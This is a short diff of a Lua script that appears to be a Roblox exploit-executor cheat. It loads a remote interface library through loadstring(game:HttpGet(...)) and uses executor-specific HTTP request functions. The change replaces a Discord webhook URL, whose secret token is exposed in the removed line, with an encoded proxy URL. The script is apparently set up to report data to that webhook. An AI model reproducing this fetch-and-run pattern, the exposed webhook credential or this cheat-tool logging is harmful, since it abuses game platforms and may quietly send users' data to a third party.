@@ -4,7 +4,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 local LocalPlayer = game:GetService("Players").LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 
-local webhookURL = "https://discord.com/api/webhooks/1358007000381788242/BxCd74Kg9DesRd7XJ0GPcCUG-0agYPsxuQeBTpqtmQtcVj-_ZmwXM9G_DhpBItXWdDIy"
+local webhookURL = "https://webhook-protect.vercel.app/api/webhook?id=MGc3TVFvejlneDRkdXFrSV9hd0I1QTpnR2h5bzQ4RVlzMjlSdVN1U0wtUUdienVjRGFmRG5KRG55LXBBRkNGTFJGRlltaEp1SDZkOWxFTk5ORVZrN1FXcnA2bVBBNUx1blJPb3c1WFlkbWdGZV9XZUhBaWN3NEdsUmh3U2x5SWFNUXdIRldPZ0xaR1gtLUNwSUVSMV9ZN0IyY3I4Nk1vYzhVRXNTajR5U1JtdEtJVTljSjQyYXVuM0J3RDNqWUNjMkE"
 local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 task.wait(0.2)
 local currentTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
